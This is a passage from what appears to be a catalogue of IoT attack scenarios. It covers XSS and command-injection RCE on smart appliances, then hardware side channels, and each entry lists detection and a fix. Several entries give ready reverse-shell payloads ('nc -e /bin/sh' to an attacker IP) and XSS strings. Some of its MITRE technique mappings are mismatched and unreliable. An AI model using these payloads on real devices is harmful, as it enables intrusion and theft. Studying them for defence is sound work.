- **Attack Steps**: Step 1: Open the monitor panel at 192.168.2.10/?q=test.Step 2: Modify URL to: ?q=<script>alert('XSS')</script>.Step 3: Press Enter.Step 4: JavaScript executes immediately.Step 5: Replace with cookie stealer or redirect payload.
- **Detection**: WAF alerts, query string analysis
- **Solution**: Encode query string output
- **Tags**: Baby Monitor XSS

## Smart Coffee Machine - RCE via “Brew Timer” API

- **Attack Type**: RCE
- **Target**: Smart Coffee Machine
- **Vulnerability**: Insecure API Command Execution
- **MITRE**: T1210
- **Impact**: IoT network pivoting
- **Tools**: curl, Netcat
- **Scenario**: The brew timer accepts raw commands via a vulnerable API endpoint meant for internal testing.
- **Attack Steps**: Step 1: Discover /api/v1/timer/set.Step 2: POST JSON: {"time":"10","cmd":"nc -e /bin/sh 192.168.0.110 9999"}.Step 3: Start nc -lvnp 9999.Step 4: API accepts and executes command.Step 5: Shell access to coffee machine OS is achieved.Step 6: Escalate to local network enumeration.
- **Detection**: API fuzzing and behavior monitoring
- **Solution**: Block test APIs in production
- **Tags**: Coffee RCE, Timer API

## XSS in Smart Speaker via Device Description

- **Attack Type**: XSS
- **Target**: Smart Speaker
- **Vulnerability**: Persistent XSS
- **MITRE**: T1059.007
- **Impact**: Credential theft, UI redirection
- **Tools**: Chrome DevTools
- **Scenario**: The web admin UI allows editing the speaker's description, which is then displayed to all connected users without escaping HTML.
- **Attack Steps**: Step 1: Connect to speaker at 192.168.0.61.Step 2: Go to “About > Description”.Step 3: Enter: <img src=x onerror=alert('XSS')>.Step 4: Save and revisit the dashboard.Step 5: Alert appears, confirming vulnerability.Step 6: Replace alert with token exfiltration script.
- **Detection**: JavaScript injection logs
- **Solution**: Encode output from description fields
- **Tags**: Speaker UI XSS

## Smart Water Tank - RCE via Calibration Script Upload

- **Attack Type**: RCE
- **Target**: Water Tank Controller
- **Vulnerability**: File Upload RCE
- **MITRE**: T1203
- **Impact**: Fake readings, flooding risk
- **Tools**: Bash shell script, Netcat
- **Scenario**: Web interface allows uploading of calibration scripts in plain shell format without validation.
- **Attack Steps**: Step 1: Create file malicious.sh with nc -e /bin/sh 192.168.0.120 8888.Step 2: Upload via “Maintenance > Upload Calibration Script”.Step 3: Start listener: nc -lvnp 8888.Step 4: Activate script through web UI.Step 5: Attacker receives root shell.Step 6: Control sensor reading outputs.
- **Detection**: Monitor executed script hash
- **Solution**: Only allow signed and validated scripts
- **Tags**: Water Tank RCE, Script Injection

## Smart Repeater - XSS via Network Alias Field

- **Attack Type**: XSS
- **Target**: Smart Wi-Fi Repeater
- **Vulnerability**: Stored XSS
- **MITRE**: T1059.007
- **Impact**: XSS on all connected devices
- **Tools**: Firefox DevTools
- **Scenario**: Admin interface allows assigning aliases to known Wi-Fi networks. No input validation is enforced.
- **Attack Steps**: Step 1: Login to repeater at 192.168.1.45.Step 2: Go to “Connected Devices”.Step 3: Set alias name: <script>alert("AliasXSS")</script>.Step 4: Save changes.Step 5: Reopen the device list. Alert triggers instantly.Step 6: Replace alert with persistent JS malware loader.
- **Detection**: Unexpected alerts in UI
- **Solution**: Input escaping before rendering
- **Tags**: Repeater Alias XSS

## IoT Clock RCE via Web Time Synchronization Tool

- **Attack Type**: RCE
- **Target**: IoT Clock
- **Vulnerability**: Time Field Command Injection
- **MITRE**: T1059.004
- **Impact**: Tampering with audit records
- **Tools**: Burp Suite, Netcat
- **Scenario**: Time sync feature allows setting a server address, which is passed directly to the shell.
- **Attack Steps**: Step 1: Access 192.168.0.160, go to “Time Settings”.Step 2: In server address field, input ntp.org; nc -e /bin/sh 192.168.0.105 7070.Step 3: Start listener: nc -lvnp 7070.Step 4: Apply the change.Step 5: Reverse shell is received on attacker machine.Step 6: Manipulate time logs or trigger persistence.
- **Detection**: Monitor NTP config logs
- **Solution**: Validate NTP format strictly
- **Tags**: Clock RCE, Time Sync

## RCE in Smart Washing Machine via OTA Debug Upload

- **Attack Type**: RCE
- **Target**: Smart Washing Machine
- **Vulnerability**: OTA Update RCE
- **MITRE**: T1203
- **Impact**: Device shutdown, config loss
- **Tools**: Tar, Netcat, Burp
- **Scenario**: OTA update form accepts tarballs containing pre-installed shell scripts with no validation.
- **Attack Steps**: Step 1: Bundle reverse shell in tar.gz (update.tar.gz).Step 2: Access admin panel at 192.168.2.70.Step 3: Upload via “System > OTA Update”.Step 4: Start listener: nc -lvnp 4444.Step 5: Apply update and wait.Step 6: Reverse shell spawns.Step 7: Modify device operation logic.
- **Detection**: Monitor update extraction behavior
- **Solution**: Enforce firmware signature validation
- **Tags**: Washing Machine OTA RCE

## Smart Toaster - XSS via Temperature Profile Name

- **Attack Type**: XSS
- **Target**: Smart Toaster
- **Vulnerability**: DOM-Based XSS
- **MITRE**: T1059.007
- **Impact**: Browser compromise
- **Tools**: Chrome DevTools
- **Scenario**: Web UI lets users create custom toasting profiles with names rendered directly into HTML.
- **Attack Steps**: Step 1: Login at 192.168.0.250.Step 2: Go to “Toasting Profiles > Add New”.Step 3: Name the profile: <svg onload=alert("ToastXSS")>.Step 4: Save and return to profiles page.Step 5: Script executes.Step 6: Replace with malicious data exfiltration script.
- **Detection**: Content Security Policy enforcement
- **Solution**: Escape input before rendering
- **Tags**: Toaster, Profile XSS

## Smart Refrigerator - RCE via Recipe Upload Form

- **Attack Type**: RCE
- **Target**: Smart Refrigerator
- **Vulnerability**: Arbitrary Script Execution
- **MITRE**: T1059.006
- **Impact**: Unauthorized device control
- **Tools**: Python, Burp Suite, Netcat
- **Scenario**: Smart refrigerator allows users to upload recipe scripts, which are executed by an internal Python interpreter without validation.
- **Attack Steps**: Step 1: Create a Python script evil.py with content:python\nimport os\nos.system('nc -e /bin/sh 192.168.0.105 9090')\nStep 2: Login to refrigerator panel at 192.168.2.100.Step 3: Navigate to “Recipes > Upload”.Step 4: Upload evil.py pretending it's a cooking automation script.Step 5: Run listener on attacker's machine: nc -lvnp 9090.Step 6: Execute uploaded script from UI.Step 7: Reverse shell opens.Step 8: Attacker gains persistent access.
- **Detection**: Monitor unexpected script output
- **Solution**: Restrict script execution, enforce whitelisting
- **Tags**: Recipe Upload RCE, Python Exploit

## Pet Feeder - XSS via Schedule Note Field

- **Attack Type**: XSS
- **Target**: Smart Pet Feeder
- **Vulnerability**: Stored XSS
- **MITRE**: T1059.007
- **Impact**: UI injection, sensitive data theft
- **Tools**: Chrome DevTools
- **Scenario**: Smart pet feeder has a note field in the feeding schedule UI that reflects unsanitized input.
- **Attack Steps**: Step 1: Access device at 192.168.0.87 and login.Step 2: Navigate to “Schedule > Add Feed Note”.Step 3: Enter: <script>alert('FeederXSS')</script>.Step 4: Save and revisit schedule page.Step 5: Alert pops up.Step 6: Replace with malicious JS to send credentials to attacker's server.
- **Detection**: CSP violation logs, DOM scanner
- **Solution**: Escape HTML in user input
- **Tags**: Pet Feeder, Schedule XSS

## Smart Oven - RCE via Recipe Configuration File

- **Attack Type**: RCE
- **Target**: Smart Oven
- **Vulnerability**: Command Injection via Config
- **MITRE**: T1059.004
- **Impact**: Appliance misuse, network foothold
- **Tools**: JSON editor, Burp Suite, Netcat
- **Scenario**: A smart oven supports custom recipe profiles uploaded in .json format. The JSON parser passes values into OS commands directly.
- **Attack Steps**: Step 1: Create a recipe.json with malicious payload:{"name":"Exploit","cookTime":"10; nc -e /bin/sh 192.168.0.105 4444"}Step 2: Login to oven UI at 192.168.0.77.Step 3: Navigate to “Profiles > Import Recipe”.Step 4: Upload the crafted file.Step 5: Run nc -lvnp 4444 on attacker's machine.Step 6: Start cooking session; shell spawns.Step 7: Full control of oven system achieved.
- **Detection**: Monitor imported JSON values
- **Solution**: Validate field format and disallow semicolons
- **Tags**: Oven JSON Config Exploit

## Smart Router - XSS in SSID Display Field

- **Attack Type**: XSS
- **Target**: Smart Router
- **Vulnerability**: External XSS Injection
- **MITRE**: T1059.007
- **Impact**: Phishing, credential theft
- **Tools**: Kali Linux (for fake AP), Burp Suite
- **Scenario**: The web interface for a home router displays SSIDs as HTML. A rogue SSID broadcast with XSS payload causes auto-execution.
- **Attack Steps**: Step 1: Set up fake access point using hostapd or airbase-ng.Step 2: Name the SSID as: <img src=x onerror=alert('RouterXSS')>.Step 3: Access router web UI at 192.168.0.1.Step 4: Scan for networks under “WiFi Settings”.Step 5: Alert pops up, proving XSS execution.Step 6: Replace with script to redirect admin UI to phishing page.
- **Detection**: Alert on malformed SSID
- **Solution**: Escape SSID content in HTML
- **Tags**: Wi-Fi Scan XSS

## Smart Humidifier - RCE via Custom Automation Rule

- **Attack Type**: RCE
- **Target**: Smart Humidifier
- **Vulnerability**: RCE via Automation Feature
- **MITRE**: T1059.004
- **Impact**: Control override, persistence
- **Tools**: Burp Suite, Netcat
- **Scenario**: Automation rules allow executing shell commands based on environmental conditions, but user input is not validated.
- **Attack Steps**: Step 1: Access humidifier panel at 192.168.0.66.Step 2: Go to “Automation > Add Rule”.Step 3: Set condition: Humidity > 70%.Step 4: Set action: nc -e /bin/sh 192.168.0.105 7878.Step 5: Start listener: nc -lvnp 7878.Step 6: Trigger humidity condition manually.Step 7: Reverse shell is opened.Step 8: Remote control and data theft achieved.
- **Detection**: Monitor unusual rule executions
- **Solution**: Validate command fields in automation builder
- **Tags**: Automation RCE, Smart Device

## Power Analysis on Smart Card-Based IoT Lock

- **Attack Type**: Power Side-Channel
- **Target**: Smart Lock
- **Vulnerability**: Power Consumption Leakage
- **MITRE**: T1040 - Network Sniffing (analogy)
- **Impact**: Unauthorized access to locked premises
- **Tools**: Oscilloscope, ChipWhisperer, Python, Power Analyzer
- **Scenario**: An attacker uses power analysis on a smart card-based IoT door lock to extract cryptographic keys.
- **Attack Steps**: Step 1: Identify the smart card chip model used in the IoT lock. Step 2: Connect the IoT device to a power monitoring device like ChipWhisperer. Step 3: Send multiple unlock requests to the lock using a computer script. Step 4: Capture power traces during encryption using an oscilloscope. Step 5: Use correlation power analysis (CPA) in Python to correlate observed traces with known key hypotheses. Step 6: Extract the secret AES key used for decryption. Step 7: Use the key to generate valid unlock commands.
- **Detection**: Unexpected energy consumption pattern, key guessing attempts
- **Solution**: Use constant power operations, physical shielding, and masking techniques
- **Tags**: side-channel, smart lock, chipwhisperer, power-analysis

## Timing Attack on IoT Smart Thermostat Authentication

- **Attack Type**: Timing Side-Channel
- **Target**: Smart Thermostat
- **Vulnerability**: Timing Response Leak
- **MITRE**: T1036 - Masquerading (timing-based)
- **Impact**: Bypass of password protection
- **Tools**: Python, Stopwatch library, Wireshark, Custom script
- **Scenario**: A hacker uses a timing-based side-channel attack to infer password characters during smart thermostat login.
- **Attack Steps**: Step 1: Analyze login response times when sending incorrect passwords. Step 2: Write a Python script to test one character at a time and measure response times. Step 3: Observe if longer response time indicates more characters matched. Step 4: Use this technique iteratively to guess the full password. Step 5: Gain unauthorized access to the thermostat.
- **Detection**: Monitor login attempts and time distribution anomalies
- **Solution**: Equalized response time logic in firmware, rate limiting
- **Tags**: timing-attack, password-guessing, thermostat

## Power-Based Extraction of RSA Keys from IoT Router

- **Attack Type**: Power Side-Channel
- **Target**: Embedded Router
- **Vulnerability**: RSA Side Channel
- **MITRE**: T1005 - Data from Local System
- **Impact**: Decryption of secure traffic
- **Tools**: ChipWhisperer, OpenSSL, Oscilloscope, SDR
- **Scenario**: Power analysis is used to extract RSA private keys from an embedded Linux-based IoT router.
- **Attack Steps**: Step 1: Identify cryptographic operations used by the router (RSA decryption). Step 2: Attach power monitoring probes to the router’s power line. Step 3: Perform multiple SSH logins or encrypted sessions. Step 4: Record power traces using oscilloscope synced with trigger signals. Step 5: Apply differential power analysis (DPA) to recover key bits. Step 6: Reconstruct private RSA key. Step 7: Use key to decrypt traffic or impersonate router.
- **Detection**: Hardware monitoring for sudden power draws
- **Solution**: Implement constant-time RSA ops and blinding
- **Tags**: rsa, side-channel, embedded router

## Cache Timing Attack on Embedded Camera Authentication

- **Attack Type**: Timing Side-Channel
- **Target**: Embedded Surveillance Camera
- **Vulnerability**: Cache Access Timing
- **MITRE**: T1207 - Rogue Software
- **Impact**: Camera compromise, privacy breach
- **Tools**: Flush+Reload tool, perf, Linux, Cachegrind
- **Scenario**: The attacker targets an embedded camera device by exploiting differences in cache timing during authentication.
- **Attack Steps**: Step 1: Gain access to a test copy of the firmware running on a similar embedded device. Step 2: Use a simulator/emulator (e.g., QEMU) to replicate login routines. Step 3: Apply cache timing analysis using Flush+Reload method to determine key operations. Step 4: Identify timing leakage in authentication routines. Step 5: Infer sensitive information such as login token or partial key. Step 6: Use inferred data to authenticate into the camera remotely.
- **Detection**: Monitor cache hit/miss pattern logs
- **Solution**: Harden firmware with constant-cache access and CPU masking
- **Tags**: cache-timing, flush-reload, camera

## Electromagnetic Analysis of Smart Meter Billing Data

- **Attack Type**: EM Side-Channel
- **Target**: Smart Meter
- **Vulnerability**: EM Emissions Leakage
- **MITRE**: T1113 - Screen Capture (analogous)
- **Impact**: Data theft, privacy compromise
- **Tools**: EM Probe, Oscilloscope, SDR, ChipWhisperer
- **Scenario**: A researcher performs electromagnetic (EM) analysis on a smart electricity meter to extract energy usage logs.
- **Attack Steps**: Step 1: Place the EM probe near the microcontroller of the smart meter. Step 2: Trigger meter updates while capturing EM emissions. Step 3: Analyze emissions with SDR and oscilloscope. Step 4: Correlate observed EM waveforms with memory access patterns. Step 5: Identify storage location and format of billing data. Step 6: Extract and reconstruct historical energy data.
- **Detection**: Detect unusual EM emissions in secure zones
- **Solution**: Shielding, clock randomization, spread spectrum
- **Tags**: em-analysis, smart-meter, power-leak

## Simple Power Analysis on IoT Crypto Chip

- **Attack Type**: Power Side-Channel
- **Target**: Crypto Co-Processor
- **Vulnerability**: Unbalanced power draw
- **MITRE**: T1040 (Sniffing) analog
- **Impact**: Cryptographic leakage
- **Tools**: ChipWhisperer Lite, Python, Oscilloscope, USB trigger
- **Scenario**: Demonstrating how simple power traces from a crypto co-processor leak binary operations (e.g., 0s and 1s in AES)
- **Attack Steps**: Step 1: Power the crypto chip using a controlled USB power supply. Step 2: Connect ChipWhisperer to the chip’s power line to monitor fluctuations. Step 3: Send repetitive encryption commands (AES-128) using a Python script. Step 4: Capture raw power traces from multiple encryptions of known plaintexts. Step 5: Observe power “spikes” corresponding to logic changes (e.g., XOR gates). Step 6: Use simple power analysis (SPA) to deduce key schedule behavior or bit positions. Step 7: Manually infer key-dependent behavior without advanced statistical analysis.
- **Detection**: Visual inspection of current profiles
- **Solution**: Balanced logic, constant power circuits
- **Tags**: spa, crypto, aes, chipwhisperer

## Power Glitching + Timing Attack on Secure Bootloader

- **Attack Type**: Power & Timing Combined
- **Target**: IoT Dev Board with Secure Boot
- **Vulnerability**: Race condition, unstable power
- **MITRE**: T1495 - Firmware Corruption
- **Impact**: Full control of system firmware
- **Tools**: Crowbar Glitcher, Logic Analyzer, Arduino, UART Tool
- **Scenario**: An attacker combines timing feedback and power glitching to skip bootloader integrity checks
- **Attack Steps**: Step 1: Identify when the device checks for firmware signatures during boot (via UART debug prints). Step 2: Connect Crowbar to power line for glitch injection. Step 3: Use logic analyzer to precisely time the glitch right after the signature verification call starts. Step 4: Reboot the device repeatedly, adjusting timing until signature verification is skipped. Step 5: Observe successful bypass and load unsigned firmware. Step 6: Log timing window for attack reproducibility.
- **Detection**: UART/bootlog analysis, power anomaly detection
- **Solution**: Boot attestation, voltage monitors
- **Tags**: power-glitch, boot-bypass, timing, arduino

## Clock Skew Fingerprinting on Embedded Surveillance System

- **Attack Type**: Timing Side-Channel
- **Target**: IP Camera / Surveillance Device
- **Vulnerability**: Clock Drift Side-Channel
- **MITRE**: T1010 - Application Window Discovery
- **Impact**: Privacy invasion, tracking
- **Tools**: Wireshark, ClockSkew tool, Python
- **Scenario**: Passive attacker remotely fingerprints and tracks a device by analyzing clock skew variations in TCP timestamps.
- **Attack Steps**: Step 1: Passively monitor TCP/IP packets from the IoT surveillance system. Step 2: Extract TCP timestamps embedded in headers. Step 3: Use ClockSkew Python tool to measure how the clock drifts over time. Step 4: Build a device fingerprint based on its unique clock drift pattern. Step 5: Use the fingerprint to identify and track the same device over VPNs or NATs.
- **Detection**: Log unusual timestamp deviations
- **Solution**: Randomized timestamp injection
- **Tags**: fingerprinting, clock-skew, passive-timing

## Fault Injection via Underclocking on Encrypted Storage Chip

- **Attack Type**: Timing Side-Channel
- **Target**: Encrypted Flash on IoT Device
- **Vulnerability**: Timing Faults
- **MITRE**: T1203 - Exploitation for Privilege Escalation
- **Impact**: Partial data exfiltration
- **Tools**: Clock Generator, JTAG, Oscilloscope, Power Supply
- **Scenario**: Underclocking causes incorrect operation in an IoT encrypted storage chip, leaking error-prone decrypted data
- **Attack Steps**: Step 1: Connect external programmable clock to the chip’s oscillator input. Step 2: Gradually reduce the clock speed during decryption processes. Step 3: Monitor outputs and observe cases when data isn't correctly decrypted. Step 4: Correlate errors in decrypted data with underclock timing. Step 5: Reverse-engineer data format and partially recover content (e.g., logs, tokens). Step 6: Repeat across power cycles to increase confidence.
- **Detection**: Power instability detection
- **Solution**: Voltage/clock stability enforcement
- **Tags**: fault-injection, underclock, secure-storage

## Differential Power Analysis on RFID Access Token Generator

- **Attack Type**: Power Side-Channel
- **Target**: RFID Keygen
- **Vulnerability**: Power Consumption Fluctuations
- **MITRE**: T1557 - Man-in-the-Middle
- **Impact**: Unauthorized access to secure zone
- **Tools**: RFID Emulator, ChipWhisperer, Python, Side-Channel Analyzer
- **Scenario**: Using many power traces to recover a key from an RFID-based secure access generator
- **Attack Steps**: Step 1: Send thousands of tag emulation requests to the RFID reader system. Step 2: Record power usage during each authentication using ChipWhisperer. Step 3: Use a statistical correlation engine to compare known challenge–response pairs. Step 4: Perform Differential Power Analysis (DPA) to find correlation between power and bits of key. Step 5: Gradually recover the internal key of the RFID system. Step 6: Clone legitimate RFID tags with recovered keys.
- **Detection**: RFID logs + excessive requests
- **Solution**: Masking, protocol redesign
- **Tags**: dpa, rfid, access-control

## Instruction Timing Leak in Custom Firmware Crypto Routine

- **Attack Type**: Timing Side-Channel
- **Target**: Microcontroller-Based IoT Device
- **Vulnerability**: Key-dependent branch execution time
- **MITRE**: T1406 - Obfuscated Files/Info
- **Impact**: Compromised encryption system
- **Tools**: Disassembler (IDA), Python, Timer utility, Logic Analyzer
- **Scenario**: Non-uniform instruction timing in custom crypto firmware leaks info about key structure
- **Attack Steps**: Step 1: Reverse-engineer the firmware using IDA to locate the crypto routine. Step 2: Use a Python-based harness to time different inputs and measure variation. Step 3: Identify input patterns that cause longer processing. Step 4: Map timing differences to possible key values or logic paths (e.g., if/else). Step 5: Use gradual key recovery over multiple iterations. Step 6: Combine timing feedback with brute-force to extract full key.
- **Detection**: Response time profiling
- **Solution**: Use constant-time libraries
- **Tags**: timing-analysis, firmware, reverse

## Side-Channel Leak via LED Blinking Pattern

- **Attack Type**: Optical Side-Channel
- **Target**: IoT Dev Board w/ LED Debug
- **Vulnerability**: Optical Leak
- **MITRE**: T1120 - Peripheral Device Discovery
- **Impact**: Information leakage via light
- **Tools**: Camera, High-FPS Video Tool, Logic Analyzer, Oscilloscope
- **Scenario**: Blinking LEDs during cryptographic operations unintentionally leak data patterns
- **Attack Steps**: Step 1: Place a high-speed camera focused on the status LED of the IoT device. Step 2: Record video while the device performs repetitive encryption or login operations. Step 3: Analyze LED blink frequency and intensity frame-by-frame. Step 4: Correlate observed blinking patterns with data being processed. Step 5: Use slow-motion or waveform view to identify cycles of operations. Step 6: Reverse-engineer logic behavior or secret data from patterns.
- **Detection**: Unexpected LED activity logs
- **Solution**: Shield debug LEDs, disable in production
- **Tags**: led-leak, optical-channel, blinking

## UART Debugging Port Reveals Timing Secrets

- **Attack Type**: Timing Side-Channel
- **Target**: Dev-Mode IoT Board
- **Vulnerability**: Timing Exposure via Debug Port
- **MITRE**: T1089 - Disabling Security Tools
- **Impact**: Local access to device & data
- **Tools**: UART Adapter, PuTTY/Minicom, Python Timer
- **Scenario**: Developer left debugging UART enabled, revealing timing differences during user authentication
- **Attack Steps**: Step 1: Connect to UART debug port using USB-to-TTL converter. Step 2: Observe boot logs and authentication messages. Step 3: Send custom login attempts and time the device’s textual responses. Step 4: Record delays after each incorrect login attempt. Step 5: Use delay pattern to infer number of correct characters. Step 6: Enumerate full password using response-based feedback.
- **Detection**: UART activity logs
- **Solution**: Disable debug interfaces in production
- **Tags**: uart, timing, password-guess

## Remote Side-Channel via CPU Load Variance

- **Attack Type**: Timing / Load Side-Channel
- **Target**: Embedded Web Device
- **Vulnerability**: Timing/Load Variance
- **MITRE**: T1499 - Endpoint Denial of Service
- **Impact**: Timing-informed attack strategies
- **Tools**: Nmap, Python Timer, Server Response Logger
- **Scenario**: Remotely monitoring server responses reveals CPU load variations linked to secret operations
- **Attack Steps**: Step 1: Send thousands of benign HTTP requests to the embedded device. Step 2: Log response times and find variance under certain conditions. Step 3: Correlate spikes in response time with background secure operations. Step 4: Predict when cryptographic keys are being accessed. Step 5: Use this knowledge to plan timing-aware exploits or DDoS mitigation.
- **Detection**: Anomalous traffic patterns
- **Solution**: Load balancing, background process obfuscation
- **Tags**: timing-response, cpu-load

## Thermal Side-Channel Leak from IoT Sensor Hub

- **Attack Type**: Thermal Side-Channel
- **Target**: Sensor Hub (ARM-based)
- **Vulnerability**: Heat leakage from chip
- **MITRE**: T1201 - Thermal Monitoring
- **Impact**: Thermal signature exploitation
- **Tools**: Thermal Camera, Python Logger, Crypto Logger
- **Scenario**: Crypto operations heat up IoT sensor hub slightly, detectable via thermal imaging
- **Attack Steps**: Step 1: Trigger repeated encryption routines on the sensor hub via API. Step 2: Capture thermal images during operation. Step 3: Compare device surface temperature before, during, and after operations. Step 4: Observe thermal hotspots aligning with sensitive chip areas. Step 5: Map duration and shape of heat signature to operation type or timing. Step 6: Infer logic timing or memory activity over repeated cycles.
- **Detection**: Detect abnormal temperature rise
- **Solution**: Physical cooling, heat shielding
- **Tags**: thermal-channel, crypto-leak

## Acoustic Cryptographic Key Extraction via CPU Noise

- **Attack Type**: Acoustic Side-Channel
- **Target**: Embedded CPU Device
- **Vulnerability**: Acoustic Leakage
- **MITRE**: T1123 - Audio Capture
- **Impact**: Secret key leakage via audio
- **Tools**: High-sensitivity Microphone, Audacity, Crypto Logger, Python
- **Scenario**: An attacker uses sound emitted by CPU during crypto operations to extract secret keys
- **Attack Steps**: Step 1: Place a sensitive microphone near the IoT device running AES encryption. Step 2: Trigger encryption repeatedly using test inputs. Step 3: Record CPU-generated audio (high-frequency noise, fan vibration). Step 4: Filter audio in Audacity to isolate CPU harmonics. Step 5: Correlate audio spikes to CPU operation cycles. Step 6: Analyze sound patterns to extract key timing and structure.
- **Detection**: Audio anomaly detection
- **Solution**: Shield CPU, eliminate mechanical vibrations
- **Tags**: acoustic-side-channel, microphone, crypto

## Photonic Side-Channel via Chip Light Emission

- **Attack Type**: Photonic Side-Channel
- **Target**: Bare Silicon Chip Device
- **Vulnerability**: EM light emission
- **MITRE**: T1552.005 - Credentials in Device Logs
- **Impact**: Key leakage through light
- **Tools**: Photodiode Sensor, High-Speed Camera, Light Isolation Chamber
- **Scenario**: The device's chip emits light during specific logic gate operations, leaking key info
- **Attack Steps**: Step 1: Remove the device casing to expose the chip. Step 2: Place a photodiode close to the chip using a microscope camera. Step 3: Run repetitive encryption operations while capturing light emission. Step 4: Measure fluctuations in light with each key-dependent operation. Step 5: Decode emissions to infer logic state changes related to key processing. Step 6: Reconstruct part of the cryptographic key.
- **Detection**: Detect light pulse variations
- **Solution**: Use opaque packaging, photon shielding
- **Tags**: photonic-leak, side-channel-optical

## Rowhammer-Induced Timing Leak in Embedded DRAM

- **Attack Type**: Timing Side-Channel
- **Target**: IoT device with external RAM
- **Vulnerability**: DRAM Row Activation Timing
- **MITRE**: T1106 - Execution through API
- **Impact**: Sensitive memory exposure
- **Tools**: Linux, Rowhammer Test Suite, Timing Logger, Memtester
- **Scenario**: A high-frequency memory access pattern causes timing variations exploitable via Rowhammer
- **Attack Steps**: Step 1: Identify DRAM rows through memory analysis tools. Step 2: Write a memory access pattern that targets rows adjacent to secret data. Step 3: Hammer (rapidly access) these rows to create disturbances. Step 4: Observe delays or bit-flips in timing-sensitive adjacent memory areas. Step 5: Extract data based on error patterns and timing shifts.
- **Detection**: Monitor DRAM error rates
- **Solution**: ECC memory, memory partitioning
- **Tags**: rowhammer, timing-fault, dram

## Magnetic Field Monitoring of IoT Motor Controller

- **Attack Type**: EM Side-Channel
- **Target**: Motor Control Unit
- **Vulnerability**: Electromagnetic Field Leakage
- **MITRE**: T1592 - Gather Victim Host Information
- **Impact**: Reveals control signals, timing
- **Tools**: Magnetometer, Hall Sensor, SDR, Oscilloscope
- **Scenario**: Capturing magnetic field from controller chip during runtime reveals PWM or command data
- **Attack Steps**: Step 1: Position a Hall sensor or magnetometer close to the controller chip. Step 2: Trigger PWM or motor operation commands via app or physical button. Step 3: Capture magnetic field fluctuations during operations. Step 4: Map patterns to logic changes inside chip (e.g., command processing). Step 5: Reverse engineer behavior or extract timing-sensitive information.
- **Detection**: Log magnetic pulses
- **Solution**: Use EM shielding or ferrite cores
- **Tags**: em-leakage, hall-sensor, pwm

## Frequency Analysis of CPU via Clock Harmonics

- **Attack Type**: Clock-Based Side-Channel
- **Target**: IoT Device with Crystal Oscillator
- **Vulnerability**: Harmonic Radiation
- **MITRE**: T1595 - Active Scanning (analogous)
- **Impact**: Reveals timing and rounds of crypto
- **Tools**: SDR, Spectrum Analyzer, External Clock, Python
- **Scenario**: Clock harmonic analysis helps extract frequency-dependent operations like crypto rounds
- **Attack Steps**: Step 1: Place SDR antenna near device clock crystal. Step 2: Capture RF emissions while device performs encryption. Step 3: Identify spikes in frequency spectrum at harmonic multiples. Step 4: Match harmonic intensity with stages of crypto processing. Step 5: Infer rounds of AES or RSA operation to time key reconstruction.
- **Detection**: Detect harmonics in spectral analysis
- **Solution**: Randomized frequency modulation
- **Tags**: rf-harmonics, clock-skew, crypto-round

## Timing Feedback via MQTT Broker Response Latency

- **Attack Type**: Timing Side-Channel
- **Target**: IoT Gateway using MQTT
- **Vulnerability**: Response time leak
- **MITRE**: T1071 - Application Layer Protocol
- **Impact**: Protocol-level information leakage
- **Tools**: MQTT Broker, Wireshark, Python Timer Script
- **Scenario**: Slow response times during encrypted payloads indicate processing bottlenecks, revealing data structure
- **Attack Steps**: Step 1: Send MQTT messages of varying lengths to device. Step 2: Measure response time using Python timer for each length. Step 3: Identify messages that induce slower processing (e.g., login packets). Step 4: Correlate delays with internal data parsing. Step 5: Infer payload structure or message type.
- **Detection**: Analyze MQTT RTT logs
- **Solution**: Normalize response handling times
- **Tags**: mqtt, timing-analysis, latency

## Cache Side-Channel via Flush+Reload in Shared IoT Gateway

- **Attack Type**: Cache Timing Side-Channel
- **Target**: Shared IoT Gateway
- **Vulnerability**: Cache Access Leakage
- **MITRE**: T1207 - Rogue Software Installation
- **Impact**: Cross-tenant leakage
- **Tools**: Flush+Reload Tool, Cachegrind, Shared Memory Tool
- **Scenario**: Exploiting shared memory in multi-tenant gateway firmware to monitor crypto ops
- **Attack Steps**: Step 1: Install a custom module on the gateway running multiple tenants. Step 2: Map shared memory regions accessed during crypto ops. Step 3: Use Flush+Reload tool to measure access timing to these areas. Step 4: Observe cache hits and misses related to key scheduling. Step 5: Infer secret data accessed by other processes.
- **Detection**: Cache hit/miss monitoring
- **Solution**: Disable memory sharing, constant access
- **Tags**: cache-leak, multi-tenant, flushreload

## Thermal Imaging to Track User Patterns in Smartwatch

- **Attack Type**: Thermal Side-Channel
- **Target**: Smartwatch Touchscreen
- **Vulnerability**: Thermal Residual Leak
- **MITRE**: T1552 - Unintended Data Leakage
- **Impact**: PIN recovery without software access
- **Tools**: FLIR Thermal Camera, IR Analysis Tool
- **Scenario**: Heat residue on touchscreen reveals user PIN input pattern
- **Attack Steps**: Step 1: Ask user to enter their PIN on smartwatch. Step 2: Immediately capture thermal image of the screen. Step 3: Analyze heat residues of touched areas. Step 4: Determine sequence based on heat intensity decay. Step 5: Guess PIN from hottest to coolest touchpoints.
- **Detection**: Monitor post-input screen
- **Solution**: Tempered glass or haptic input
- **Tags**: thermal-pin, smartwatch, ir-residue

## Acoustic Analysis of Button Press Patterns in Keypad Lock

- **Attack Type**: Acoustic Side-Channel
- **Target**: IoT Keypad Lock
- **Vulnerability**: Acoustic Button Press Signature
- **MITRE**: T1110 - Brute Force (acoustic)
- **Impact**: Remote passcode guessing
- **Tools**: Parabolic Mic, High-Quality Recorder, Sound Analyzer
- **Scenario**: Sound of each button press is acoustically distinct; attacker records pattern remotely
- **Attack Steps**: Step 1: Place directional microphone aimed at keypad from a distance. Step 2: Record sound as user enters code. Step 3: Use waveform tool to differentiate sound amplitude per key. Step 4: Identify number of presses and estimate value per tone. Step 5: Reconstruct passcode.
- **Detection**: Acoustic pattern detection
- **Solution**: Sound-dampening keypads
- **Tags**: keypad-sound, remote-audio, pin-analysis

## EM Leakage from NFC Payment Device During Transaction

- **Attack Type**: EM Side-Channel
- **Target**: NFC Reader Device
- **Vulnerability**: Near-field EM Leakage
- **MITRE**: T1557 - Intercept Communications
- **Impact**: Key prediction or replay
- **Tools**: SDR Receiver, NFC Logger, EM Probe
- **Scenario**: Device leaks short EM bursts during key generation phase of NFC tap, capturable via SDR
- **Attack Steps**: Step 1: Simulate NFC payment with a test card. Step 2: Place EM probe or SDR close to reader antenna. Step 3: Capture EM waveforms during transaction. Step 4: Isolate wave bursts during key exchange process. Step 5: Decode protocol step and attempt to infer private values.
- **Detection**: EM waveform profiling
- **Solution**: Shield antenna & randomize handshake
- **Tags**: nfc-em, payment-device, rf-leak

## Infrared Side-Channel Leak from IoT IR Remote

- **Attack Type**: Infrared Side-Channel
- **Target**: Smart TV / IR-based IoT
